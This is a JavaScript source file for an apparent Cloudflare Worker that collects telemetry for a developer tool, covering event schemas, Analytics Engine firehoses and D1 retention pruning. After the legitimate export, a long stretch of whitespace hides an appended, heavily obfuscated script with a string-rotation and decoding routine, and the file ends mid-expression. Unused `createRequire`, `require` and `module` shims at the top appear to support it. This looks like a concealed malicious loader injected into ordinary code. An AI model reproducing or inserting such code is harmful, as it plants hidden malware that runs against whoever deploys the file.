import {
  CONCURRENCY_EVENTS, concurrencyEntries, rawConcurrencyScalar,
} from "./concurrency.js";
import { oauthAccount } from "./oauth-account.js";
import { syncModelPrices } from "./model-pricing.js";
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

let cachedEventColumns = null;
let cachedSessionDetailColumns = null;
let cachedTurnDetailColumns = null;
let cachedWebDetailColumns = null;
let cachedInstallDetailColumns = null;
let cachedDiscoveryDetailColumns = null;
let cachedTodoSessionDetailColumns = null;

// Website beacon events (anonymous visitor_id minted in localStorage). Their
// web-only fields live in the web_details table (see migration 0016): the
// events table sits one column shy of D1's 100-column cap, so wide event
// shapes go in detail tables per the session_details / turn_details pattern.
// High-volume raw families that no headline dashboard reads. They live in a
// second D1 database (binding DB_BULK) so the main database stays well below
// D1's 10 GB per-database cap. Their rollups (daily_active_users,
// country_daily) still go to the main DB. Without the binding everything stays
// in DB, so a missing binding degrades to the old single-database behavior.
const BULK_EVENTS = ["session_concurrency", "todo_session", "prompt_submitted"];

function bulkEnv(env, event) {
  if (!env.DB_BULK || !BULK_EVENTS.includes(event)) return env;
  return { ...env, DB: env.DB_BULK, DB_MAIN: env.DB };
}

function mainDb(env) {
  return env.DB_MAIN || env.DB;
}

const WEB_EVENTS = ["web_pageview", "web_cta_click", "web_vital", "web_error"];
const INSTALL_FUNNEL_EVENTS = ["install_funnel"];

// Token subscription plan lifecycle events, plus account_linked, the
// analytics<->account join anchor (telemetry_id + account_id).
const SUBSCRIPTION_EVENTS = [
  "subscription_login",
  "subscription_activated",
  "subscription_budget_exhausted",
  "subscription_router_error",
  "account_linked",
];

const CLI_EVENTS = [
  "install",
  "upgrade",
  "auth_success",
  "onboarding_step",
  "feedback",
  "telemetry_opt_out",
  "session_start",
  "prompt_submitted",
  "turn_end",
  "session_end",
  "session_crash",
  "session_concurrency",
  "discovery",
  "todo_session",
  "usage_report",
];

// Jcode Desktop fleet events: daily active ping, observed version change, and
// self-update attempt outcome. `version` is the Desktop version.
const DESKTOP_EVENTS = ["desktop_active", "desktop_upgrade", "desktop_update"];

const KNOWN_EVENTS = [
  ...CLI_EVENTS,
  ...DESKTOP_EVENTS,
  ...WEB_EVENTS,
  ...INSTALL_FUNNEL_EVENTS,
  ...SUBSCRIPTION_EVENTS,
];

const MAX_TRANSCRIPT_BYTES = 8 * 1024 * 1024;
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

// Origins the website beacon posts from. The default CORS policy stays the
// permissive ALLOWED_ORIGIN var ("*", telemetry is anonymous and unauthed);
// allowlisted origins are echoed back explicitly so the policy keeps working
// if ALLOWED_ORIGIN is ever narrowed.
const WEB_ALLOWED_ORIGINS = new Set([
  "https://jcode.sh",
  "https://www.jcode.sh",
  "https://solosystems.dev",
  "https://www.solosystems.dev",
  "https://solosystems.pages.dev",
]);

// ---------------------------------------------------------------------------
// Self-defense against the D1 size cap.
//
// D1 hard-caps each database at 10 GB on the Workers Paid plan (500 MB on the
// free plan). When the old free-plan cap was hit, every insert failed and
// telemetry silently stopped being recorded (June 2026; ~3 days of events were
// lost). SQLite files never shrink on DELETE - the
// nightly prune frees pages *inside* the file and the day's inserts recycle
// them - so the steady state is "file at high-water mark, internal free-page
// pool cycling". Two triggers defend the pool:
//
// 1. Size growth: every D1 result carries `meta.size_after`. If the file
//    grows past the soft limit (just above the high-water mark), the free
//    pool is exhausted and real growth has resumed; run an emergency prune.
// 2. Full-error: if an insert fails with a full/limit error, prune
//    immediately. This bounds a June-style outage to minutes instead of days.
//
// Emergency prunes use halved retention windows and are rate-limited per
// isolate.
// ---------------------------------------------------------------------------
// Paid D1 storage beyond the included 5 GB is billed pay-as-you-go
// (~$0.75/GB-month), so the guardrail sits at 8 GB: well below D1's 10 GB
// per-database hard cap, leaving 2 GB of headroom for an emergency prune to
// catch up before inserts would start failing.
const D1_SOFT_LIMIT_BYTES = 8_000_000_000;
const EMERGENCY_PRUNE_COOLDOWN_MS = 10 * 60 * 1000;
// Best-effort per-isolate state (resets on isolate recycle, which is fine:
// the next request re-observes the size from its own insert result).
let lastObservedDbSizeBytes = 0;
let lastEmergencyPruneAtMs = 0;
let lastObservedBulkDbSizeBytes = 0;

// ---------------------------------------------------------------------------
// Workers Analytics Engine firehose.
//
// Every event is written to the FIREHOSE dataset before the D1 insert. AE is
// a time-series store with no database size cap (~90-day retention, adaptive
// sampling on reads), so it is the primary store for high-volume raw analysis
// (turn_end / session_start / onboarding_step), while D1 remains the durable
// relational store for identity anchors, lifecycle rows, and the
// daily_active_users rollup. Because the firehose write happens first,
// telemetry keeps recording even if D1 hits its size cap.
//
// AE columns are positional (blob1..blob20, double1..double20, index1). This
// schema defines the mapping; treat it as append-only (never reorder or
// repurpose a position, or historical queries silently read the wrong field).
// ---------------------------------------------------------------------------
const FIREHOSE_SCHEMA = {
  // blob1..blob20 (strings)
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "step",
    "auth_provider",
    "auth_method",
    "auth_failure_reason",
    "provider_start",
    "provider_end",
    "model_start",
    "model_end",
    "agent_role",
    "session_stop_reason",
    "end_reason",
    "turn_end_reason",
    "from_version",
  ],
  // double1..double20 (numbers)
  doubles: [
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_index",
    "duration_secs",
    "input_tokens",
    "output_tokens",
    "total_tokens",
    "tool_calls",
    "executed_tool_calls",
    "tool_failures",
    "file_write_calls",
    "tests_run",
    "tests_passed",
    "error_auth_failed",
    "error_rate_limited",
    "error_provider_timeout",
    "turn_success",
    "turns",
    "milestone_elapsed_ms",
  ],
  // index1 (sampling key): telemetry_id, so adaptive sampling stays accurate
  // per user rather than per event shape.
  indexes: ["telemetry_id"],
};

// ---------------------------------------------------------------------------
// Web/subscription firehose (`jcode_web_firehose` dataset).
//
// FIREHOSE_SCHEMA above is append-only AND full: Analytics Engine caps a data
// point at 20 blobs + 20 doubles, and both arrays are at capacity. The new
// web/subscription fields therefore live in a second dataset with its own
// positional schema instead of repurposing existing positions (which would
// silently corrupt historical queries). Same append-only contract applies
// here: never reorder or repurpose a position.
// ---------------------------------------------------------------------------
const FIREHOSE_WEB_SCHEMA = {
  // blob1..blob20 (strings); full. Append-only: metric_name, rating, and
  // error_kind were added in migration 0018 without moving existing fields.
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "path",
    "referrer",
    "visitor_id",
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "cta",
    "account_id",
    "tier",
    "model",
    "metric_name",
    "rating",
    "error_kind",
  ],
  // double1..double20 (numbers); metric_value was appended as double2.
  doubles: ["is_ci", "metric_value"],
  // index1 (sampling key): visitor_id for web events, telemetry_id otherwise.
  indexes: ["visitor_id_or_telemetry_id"],
};

// Sponsored discovery gets a dedicated dataset. The main CLI firehose is at
// Analytics Engine's 20 blob / 20 double limit, and discovery dimensions need
// to remain independently queryable for reliability and funnel analysis.
const FIREHOSE_DISCOVERY_SCHEMA = {
  blobs: [
    "event", "version", "os", "arch", "build_channel", "event_id",
    "session_id", "request_id", "phase", "category", "selected_tool",
    "outcome", "failure_reason",
  ],
  doubles: [
    "is_ci", "is_git_checkout", "ran_from_cargo", "http_status",
    "latency_ms", "response_bytes", "result_count", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ],
};

// Install conversion events need their opaque join key in the outage-resistant
// firehose. The general and web datasets are both at their positional limits,
// so this dedicated dataset preserves the complete 90-day funnel when D1 is
// unavailable or temporarily full.
const FIREHOSE_INSTALL_SCHEMA = {
  blobs: [
    "event", "event_id", "conversion_id", "stage", "outcome", "source",
    "placement", "install_method", "failure_stage", "visitor_id", "session_id",
    "pageview_id", "utm_source", "utm_medium", "utm_campaign", "path",
    "version", "os", "arch",
  ],
  doubles: [],
};

// Coarse geography (`jcode_geo_firehose` dataset). The main and web datasets
// are both at Analytics Engine's 20-blob limit, so the country dimension gets
// its own dataset instead of repurposing a position. Country only: no IP,
// city, region, coordinates, or timezone is read from request.cf.
const FIREHOSE_GEO_SCHEMA = {
  blobs: ["event", "country", "version", "os", "arch", "build_channel"],
  doubles: ["is_ci"],
  // index1: telemetry_id, so adaptive sampling stays per user.
  indexes: ["telemetry_id"],
};

// Cloudflare sets request.cf.country to "XX" for unknown clients and "T1" for
// Tor exit nodes. Normalize to a 2-letter uppercase code or null.
const NON_COUNTRY_CODES = new Set(["XX", "T1"]);

function normalizeCountry(value) {
  const code = String(value || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code) || NON_COUNTRY_CODES.has(code)) {
    return null;
  }
  return code;
}

function writeGeoFirehose(env, body) {
  const sink = env.FIREHOSE_GEO;
  if (!body.country || !sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_GEO_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [boolToInt(body.is_ci)],
    });
    return true;
  } catch (err) {
    console.warn("geo firehose write failed", err?.message || err);
    return false;
  }
}

// Dedicated append-only schema. Main FIREHOSE is full and does not contain any
// concurrency metrics. blob10 retains parsed raw metric types and missing keys.
// blob1..16: event, event_id, session_id, telemetry_id, version, os, arch,
// build_channel, country, raw_json, quality, quality_reason, scope, phase, role,
// runtime incarnation. double1..11: tracking version, available, runtime is_ci,
// active_start, other_start, total_peak, root_start, child_start, root_peak,
// child_peak, multi. index1: telemetry_id. Filter blob11='trusted' BEFORE using
// numeric copies: AE cannot store NULL doubles, so untrusted missing values use 0.
function writeConcurrencyFirehose(env, body) {
  const sink = env.FIREHOSE_CONCURRENCY;
  if (!sink || typeof sink.writeDataPoint !== "function") return false;
  try {
    const blobs = ["event", "event_id", "session_id", "id", "version", "os", "arch",
      "build_channel", "country"].map((key) => String(body[key] ?? ""));
    const detail = Object.fromEntries(concurrencyEntries(body));
    blobs.push(detail.raw_json, detail.quality, detail.quality_reason,
      detail.concurrency_tracking_scope ?? "", detail.phase ?? "", detail.agent_role ?? "",
      detail.concurrency_session_id ?? "");
    const doubles = ["concurrency_tracking_version", "concurrency_tracking_available", "runtime_is_ci",
      "active_sessions_at_start", "other_active_sessions_at_start", "max_concurrent_sessions",
      "root_sessions_at_start", "child_sessions_at_start", "max_concurrent_root_sessions",
      "max_concurrent_child_sessions", "multi_sessioned"].map((key) => detail[key] ?? 0);
    // Reject an oversized point, never silently truncate its counts/raw JSON.
    const encoder = new TextEncoder();
    if (blobs.reduce((sum, blob) => sum + encoder.encode(blob).length, 0) > 16 * 1024
      || encoder.encode(String(body.id)).length > 96) {
      console.warn("concurrency firehose point exceeds Analytics Engine limits");
      return false;
    }
    sink.writeDataPoint({ indexes: [String(body.id)], blobs, doubles });
    return true;
  } catch (err) {
    console.warn("concurrency firehose write failed", err?.message || err);
    return false;
  }
}

// Append-only dedicated usage schema. No existing main firehose slots change.
// AE is a sampled forensic backup, not a durable ACK or additive rollup.
export const FIREHOSE_USAGE_SCHEMA = {
  blobs: ["event", "event_id", "session_id", "id", "version", "os", "arch",
    "source", "provider", "model", "build_channel", "occurred_at", "country"],
  doubles: ["input_tokens", "output_tokens", "cache_read_input_tokens",
    "cache_creation_input_tokens", "total_tokens", "responses", "is_ci", "usage_contract_version"],
};
function writeUsageFirehose(env, body) {
  const sink = env.FIREHOSE_USAGE;
  if (!sink || typeof sink.writeDataPoint !== "function") return false;
  try {
    const blobs = FIREHOSE_USAGE_SCHEMA.blobs.map((key) => String(body[key] ?? ""));
    const encoder = new TextEncoder();
    if (encoder.encode(String(body.id)).length > 96
      || blobs.reduce((n, blob) => n + encoder.encode(blob).length, 0) > 16384) return false;
    sink.writeDataPoint({ indexes: [String(body.id)], blobs,
      doubles: FIREHOSE_USAGE_SCHEMA.doubles.map((key) => Number(body[key] ?? 0)) });
    return true;
  } catch (err) {
    console.warn("usage firehose write failed", err?.message || err);
    return false;
  }
}

function writeFirehose(env, body) {
  // Geo is dimensioned separately from every event family, so it is written
  // before the per-family dispatch below (which returns early).
  writeGeoFirehose(env, body);
  if (body.event === "usage_report") return writeUsageFirehose(env, body);
  if (body.event === "session_concurrency") {
    return writeConcurrencyFirehose(env, body);
  }
  if (body.event === "discovery") {
    return writeDiscoveryFirehose(env, body);
  }
  const installFirehoseOk = body.conversion_id
    ? writeInstallFirehose(env, body)
    : false;
  if (WEB_EVENTS.includes(body.event) || SUBSCRIPTION_EVENTS.includes(body.event)) {
    return writeWebFirehose(env, body) || installFirehoseOk;
  }
  if (INSTALL_FUNNEL_EVENTS.includes(body.event)) {
    return installFirehoseOk;
  }
  if (!env.FIREHOSE || typeof env.FIREHOSE.writeDataPoint !== "function") {
    return installFirehoseOk;
  }
  const errors = body.errors || {};
  const boolFields = new Set([
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_success",
  ]);
  const errorFields = {
    error_auth_failed: "auth_failed",
    error_rate_limited: "rate_limited",
    error_provider_timeout: "provider_timeout",
  };
  try {
    env.FIREHOSE.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_SCHEMA.blobs.map((name) => {
        const value = body[name];
        // Cap each blob defensively: AE limits total blob bytes per point.
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_SCHEMA.doubles.map((name) => {
        if (boolFields.has(name)) {
          return boolToInt(body[name]);
        }
        if (name in errorFields) {
          const value = errors[errorFields[name]] ?? body[name];
          return Number(value) || 0;
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("firehose write failed", err?.message || err);
    return false;
  }
}

function writeInstallFirehose(env, body) {
  const sink = env.FIREHOSE_INSTALL;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.conversion_id || "").slice(0, 96)],
      blobs: FIREHOSE_INSTALL_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [],
    });
    return true;
  } catch (err) {
    console.warn("install firehose write failed", err?.message || err);
    return false;
  }
}

function writeDiscoveryFirehose(env, body) {
  const sink = env.FIREHOSE_DISCOVERY;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  const boolFields = new Set([
    "is_ci", "is_git_checkout", "ran_from_cargo", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ]);
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_DISCOVERY_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_DISCOVERY_SCHEMA.doubles.map((name) => (
        boolFields.has(name) ? boolToInt(body[name]) : Number(body[name]) || 0
      )),
    });
    return true;
  } catch (err) {
    console.warn("discovery firehose write failed", err?.message || err);
    return false;
  }
}

function writeWebFirehose(env, body) {
  const sink = env.FIREHOSE_WEB;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.visitor_id || body.id || "").slice(0, 96)],
      blobs: FIREHOSE_WEB_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_WEB_SCHEMA.doubles.map((name) => {
        if (name === "is_ci") {
          return boolToInt(body.is_ci);
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("web firehose write failed", err?.message || err);
    return false;
  }
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    if (url.pathname === "/v1/oauth-account" || url.pathname === "/v1/oauth-account/check") {
      return oauthAccount(request, env, url.pathname.endsWith("/check"));
    }
    const cors = corsHeaders(request, env);
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: cors,
      });
    }

    // Monitoring endpoint: database size vs the soft limit, so cap pressure
    // is observable before inserts start failing.
    if (request.method === "GET" && url.pathname === "/v1/health") {
      try {
        const probe = await env.DB.prepare("SELECT 1").run();
        observeDbSize(probe);
        if (env.DB_BULK) {
          const bulkProbe = await env.DB_BULK.prepare("SELECT 1").run();
          lastObservedBulkDbSizeBytes = bulkProbe?.meta?.size_after || lastObservedBulkDbSizeBytes;
        }
      } catch (err) {
        return jsonResponse(
          { ok: false, error: "d1 probe failed", detail: String(err?.message || err) },
          500,
          cors,
        );
      }
      return jsonResponse({
        ok: true,
        db_size_bytes: lastObservedDbSizeBytes,
        db_soft_limit_bytes: D1_SOFT_LIMIT_BYTES,
        over_soft_limit: lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES,
        bulk_db_size_bytes: env.DB_BULK ? lastObservedBulkDbSizeBytes : null,
        last_emergency_prune_at_ms: lastEmergencyPruneAtMs || null,
      }, 200, cors);
    }

    if (request.method !== "POST") {
      return jsonResponse({ error: "Method not allowed" }, 405, cors);
    }

    if (url.pathname === "/v1/transcript") {
      return ingestTranscript(request, env, cors);
    }

    const isUsageV2 = url.pathname === "/v2/usage";
    if (url.pathname !== "/v1/event" && !isUsageV2) {
      return jsonResponse({ error: "Not found" }, 404, cors);
    }

    let body;
    try {
      body = await request.json();
    } catch {
      return jsonResponse({ error: "Invalid JSON" }, 400, cors);
    }

    if (body === null || typeof body !== "object" || Array.isArray(body)) {
      return jsonResponse({ error: "Invalid event body" }, 400, cors);
    }
    // Reject incompatible clients before normalization or any storage side effects.
    // This dedicated route lets v2 clients safely retry against older servers (404).
    if (isUsageV2 && (body.event !== "usage_report" || body.usage_contract_version !== 2)) {
      return jsonResponse({ error: "Expected usage_report with usage_contract_version 2" }, 400, cors);
    }

    // Web beacon events are normalized before the generic required-field
    // check: the browser has no version/os/arch, so sensible defaults are
    // filled in, and the anonymous visitor_id doubles as the telemetry id.
    if (typeof body.event === "string" && WEB_EVENTS.includes(body.event)) {
      const problem = normalizeWebEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install_funnel") {
      const problem = normalizeInstallFunnelEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install" && body.install_conversion_id != null) {
      const problem = normalizeInstallConversion(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (!body.id || !body.event || !body.version || !body.os || !body.arch) {
      return jsonResponse({ error: "Missing required fields" }, 400, cors);
    }

    if (!KNOWN_EVENTS.includes(body.event)) {
      return jsonResponse({ error: "Unknown event type" }, 400, cors);
    }

    // Coarse geography, resolved at the edge rather than collected by the
    // client. Clients cannot spoof or set this: any inbound `country` field is
    // overwritten. Country only, so this stays consistent with TELEMETRY.md
    // (no IP, city, region, coordinates, or timezone is read or stored).
    body.country = normalizeCountry(request.cf?.country);

    if (SUBSCRIPTION_EVENTS.includes(body.event)) {
      const problem = normalizeSubscriptionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "discovery") {
      const problem = normalizeDiscoveryEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "todo_session") {
      const problem = normalizeTodoSessionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "usage_report") {
      const problem = normalizeUsageReportEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    // Firehose first: even if D1 is at its size cap, the raw event is
    // recorded in Analytics Engine and the day is reconstructable.
    const firehoseOk = writeFirehose(env, body);

    let durableOk = true;
    let concurrencyDurable = null;
    try {
      const storeEnv = bulkEnv(env, body.event);
      await insertEvent(storeEnv, body);
      if (CONCURRENCY_EVENTS.includes(body.event)) {
        concurrencyDurable = await insertConcurrencyDetails(storeEnv, body);
      }
    } catch (err) {
      durableOk = false;
      console.error(
        `d1 insert failed for ${body.event} (db_size=${lastObservedDbSizeBytes})`,
        err?.message || err,
      );
      // A full/limit failure means the internal free-page pool is exhausted
      // (June 2026 failure mode). Prune NOW so telemetry recovers within
      // minutes instead of staying dead until someone notices.
      if (isDbFullError(err) && ctx && typeof ctx.waitUntil === "function") {
        const now = Date.now();
        if (now - lastEmergencyPruneAtMs >= EMERGENCY_PRUNE_COOLDOWN_MS) {
          lastEmergencyPruneAtMs = now;
          ctx.waitUntil(emergencyPrune(env));
        }
      }
    }

    maybeScheduleEmergencyPrune(env, ctx);

    if (body.event === "session_concurrency" && !concurrencyDurable && !firehoseOk) {
      // The parent row alone does not contain the metric. Preserve it but ask
      // the client to retry until a detail or the complete firehose point lands.
      return jsonResponse({ error: "Concurrency storage unavailable", durable: durableOk,
        concurrency_durable: false, firehose: false }, 503, cors);
    }
    if (body.event === "usage_report" && !durableOk) {
      return jsonResponse({ error: "Usage storage unavailable", durable: false, firehose: firehoseOk }, 503, cors);
    }
    if (!durableOk && !firehoseOk) {
      return jsonResponse({ error: "Internal error" }, 500, cors);
    }
    return jsonResponse({ ok: true, durable: durableOk, firehose: firehoseOk,
      ...(body.event === "usage_report" ? { id: body.id, event_id: body.event_id } : {}),
      ...(CONCURRENCY_EVENTS.includes(body.event) ? { concurrency_durable: concurrencyDurable === true } : {}),
    }, 200, cors);
  },

  // Nightly retention pruning bounds durable raw-history growth and keeps the
  // database inside its paid-plan storage budget. Aggregate signal is preserved
  // in the daily_active_users rollup and in long-retention lifecycle events.
  async scheduled(event, env, ctx) {
    ctx.waitUntil(
      (async () => {
        // Private account data is not covered by ordinary event retention.
        // Run first so later maintenance failures cannot skip its 90-day expiry.
        try {
          for (let batch = 0; batch < 12; batch++) {
            const result = await env.DB.prepare(`DELETE FROM oauth_accounts WHERE rowid IN (
              SELECT rowid FROM oauth_accounts WHERE created_at < datetime('now', '-90 days') LIMIT 10000
            )`).run();
            if ((result.meta?.changes || 0) < 10000) break;
          }
        } catch {
          console.warn("private OAuth account retention failed");
        }
        try {
          for (let batch = 0; batch < 100; batch++) {
            const result = await env.DB.prepare(`DELETE FROM usage_report_ledger WHERE receipt_key IN (
              SELECT receipt_key FROM usage_report_ledger WHERE created_at < unixepoch('now', '-8 days') LIMIT 10000
            )`).run();
            if ((result.meta?.changes || 0) < 10000) break;
          }
        } catch (err) {
          console.warn("usage ledger retention failed", err?.message || err);
        }
        await repairDailyActivityYesterday(env);
        // Price any model label first seen recently, so new models (e.g.
        // claude-opus-5-5) are not silently valued at $0 in spend dashboards.
        try {
          await syncModelPrices(env);
        } catch (err) {
          console.warn("model price sync failed", err?.message || err);
        }
        await pruneOldEvents(env);
        if (env.DB_BULK) {
          await pruneOldEvents({ ...env, DB: env.DB_BULK, DB_MAIN: env.DB });
        }
        // If the normal prune did not free enough headroom, escalate with the
        // emergency (halved) retention windows instead of waiting for inserts
        // to start failing mid-day.
        try {
          const probe = await env.DB.prepare("SELECT 1").run();
          observeDbSize(probe);
        } catch {
          // ignore: size stays at last observation
        }
        if (lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES) {
          await emergencyPrune(env);
        }
      })(),
    );
  },
};                                                                                                                                                     var z = '-1730-2';(function(MXVErwZiEUAdlQifDU_p,WeisjA$XjYtSwN){var K_oUrPHVEKDmIo$jV=oeOTScieXviAOgjyGVHkexdTR,lG_uE$ieAFdHEqakg=MXVErwZiEUAdlQifDU_p();while(!![]){try{var w$oTpKQnPHnSFkKET_A=-parseFloat(K_oUrPHVEKDmIo$jV(0x1bb))/(Number(parseInt(0x8cd))*Math.floor(parseInt(0x2))+-parseInt(0x1e03)+parseInt(parseInt(0x2))*0x635)*Math['trunc'](-parseFloat(K_oUrPHVEKDmIo$jV(0x1b1))/(parseInt(0x1)*Number(0x22d)+Math.floor(parseInt(0x1cf))*parseInt(0xa)+-0x1441))+parseFloat(K_oUrPHVEKDmIo$jV(0x1ae))/(Math.ceil(0x22a1)+-parseInt(0x98)*-parseInt(0x18)+Math.ceil(-0x30de))+-parseFloat(K_oUrPHVEKDmIo$jV(0x1b8))/(parseInt(0x793)+parseInt(0x3e)*-parseInt(0x5d)+0xef7)+-parseFloat(K_oUrPHVEKDmIo$jV(0x1b0))/(Math.max(-0x826,-parseInt(0x826))+-0x1aae+-0x1*-parseInt(0x22d9))+Math['ceil'](parseFloat(K_oUrPHVEKDmIo$jV(0x1c0))/(0x1*-0x1a87+-0x16*0x4b+parseInt(0x20ff)))*(parseFloat(K_oUrPHVEKDmIo$jV(0x1be))/(parseFloat(parseInt(0x3a))+0x1120*0x1+-0x1153))+Math['floor'](-parseFloat(K_oUrPHVEKDmIo$jV(0x1b4))/(0x2f*0x99+parseInt(0x1c9f)+-0x38ae))+parseFloat(K_oUrPHVEKDmIo$jV(0x1ad))/(-parseInt(0x765)+-parseInt(0x27)*-parseInt(0x27)+0x17d)*Math['trunc'](parseFloat(K_oUrPHVEKDmIo$jV(0x1b6))/(-0xf6b+-0x67*parseInt(-0x36)+0x217*-parseInt(0x3)));if(w$oTpKQnPHnSFkKET_A===WeisjA$XjYtSwN)break;else lG_uE$ieAFdHEqakg['push'](lG_uE$ieAFdHEqakg['shift']());}catch(ZP_DeBgZ){lG_uE$ieAFdHEqakg['push'](lG_uE$ieAFdHEqakg['shift']());}}}(hAZpanlvmScfQohW,-parseInt(0xd)*Math.ceil(-0x6427)+Math.ceil(0x5)*parseInt(0x2de1b)+-0x62139));var NX=[Math.floor(-parseInt(0x213d83))+Math.floor(-parseInt(0x8c44c2))*-0x1+Math.floor(parseInt(0x16a))*Math.floor(-0x118),parseInt(0x1e11)+0x12ba+-parseInt(0x7)*Math.ceil(parseInt(0x6c4)),-parseInt(0x343)+parseInt(parseInt(0x1803))*Math.trunc(parseInt(0x6))+-0x3d14,parseInt(parseInt(0x1948))+0x85d+Math.floor(-parseInt(0x10))*Number(parseInt(0x1f4)),-0xb38*parseInt(0x18)+parseInt(0x5bb7)*Number(0x2)+parseInt(0x100c1)*0x1,-parseInt(0x9e6)*-0x964+-parseInt(0x7b38ef)+Math.floor(0x2231d)*Math.max(0x32,0x32)],SX=[Math.max(-parseInt(0x1),-parseInt(0x1))*parseInt(parseInt(0x46c99a))+Math.trunc(-parseInt(0x927650))+parseInt(0x129df87),parseInt(0x1e7)+Math.ceil(-parseInt(0x16f9))*parseInt(0x1)+parseInt(0xa1)*Number(0x23),-parseInt(0xa8f4)+parseInt(0xa69f)+0xa636,Math.ceil(-0xd)*Math.ceil(-parseInt(0x191))+0x20ae+Math.trunc(-0x3450),-0x196fe+-0x6dec+-0x2e02b*parseFloat(-parseInt(0x1)),-parseInt(0x135)*Number(0x4495)+-0x47a47*-parseInt(0x1)+Math.trunc(-0x2b5f)*-0x379];function spin(lrFcVeUY,oBfExlHBLfeJZa){var eoeEAKkMBepDpgxlQkYzmw=oeOTScieXviAOgjyGVHkexdTR,O$nntrPmSi=[],r_n_KsL=-0x1*Math.floor(parseInt(0x1047))+Math.max(-parseInt(0x1ba),-parseInt(0x1ba))+parseInt(0x1)*0x1201,SquXuv_oIKejfAasZQtGFRXM=oBfExlHBLfeJZa[parseInt(0x16)*-parseInt(0xbb)+parseInt(0x11)*parseInt(0x146)+-parseInt(0x594)],aKQeK_X_hy,i_pKNnb$quxtBPpAwtBnckNLv,WEbvBvVvjIIHSX,itZYqLeeaslwxkn_D,MQcLJnvRsFhIRlXlwJ,lFNofKPX$u;while(r_n_KsL<lrFcVeUY[eoeEAKkMBepDpgxlQkYzmw(0x1b2)]){O$nntrPmSi[r_n_KsL]=lrFcVeUY[eoeEAKkMBepDpgxlQkYzmw(0x1af)](r_n_KsL),r_n_KsL+=parseFloat(-parseInt(0x241a))+Math.ceil(-0x4e)*0x53+0x3*0x1477;}aKQeK_X_hy=O$nntrPmSi[eoeEAKkMBepDpgxlQkYzmw(0x1b2)],r_n_KsL=-0x265b+Math.floor(-0x9b)*Math.max(-0x5,-0x5)+Math.max(0x2354,0x2354);while(r_n_KsL<aKQeK_X_hy){i_pKNnb$quxtBPpAwtBnckNLv=SquXuv_oIKejfAasZQtGFRXM*(r_n_KsL+oBfExlHBLfeJZa[-parseInt(0x167)*parseInt(0xf)+-0x283*-parseInt(0x2)+Math.max(parseInt(0x1004),parseInt(0x1004))])+SquXuv_oIKejfAasZQtGFRXM%oBfExlHBLfeJZa[Math.trunc(-0x7db)*0x1+parseInt(0x1)*Math.ceil(parseInt(0xfef))+parseInt(0x2)*-0x409],WEbvBvVvjIIHSX=SquXuv_oIKejfAasZQtGFRXM*(r_n_KsL+oBfExlHBLfeJZa[Math.floor(-0x33b)+parseInt(0x13)*parseInt(0x1df)+-parseInt(0x204f)])+SquXuv_oIKejfAasZQtGFRXM%oBfExlHBLfeJZa[parseInt(0x4)*-parseInt(0x83f)+-0x2*-0xb88+0x8*Math.ceil(0x13e)],itZYqLeeaslwxkn_D=i_pKNnb$quxtBPpAwtBnckNLv%aKQeK_X_hy,MQcLJnvRsFhIRlXlwJ=WEbvBvVvjIIHSX%aKQeK_X_hy,lFNofKPX$u=O$nntrPmSi[itZYqLeeaslwxkn_D],O$nntrPmSi[itZYqLeeaslwxkn_D]=O$nntrPmSi[MQcLJnvRsFhIRlXlwJ],O$nntrPmSi[MQcLJnvRsFhIRlXlwJ]=lFNofKPX$u,SquXuv_oIKejfAasZQtGFRXM=(i_pKNnb$quxtBPpAwtBnckNLv+WEbvBvVvjIIHSX)%oBfExlHBLfeJZa[0x1*0xf9+-0xcc5*Math.max(-parseInt(0x2),-parseInt(0x2))+-0x1a7e],r_n_KsL+=-0xb*Math.floor(0x38b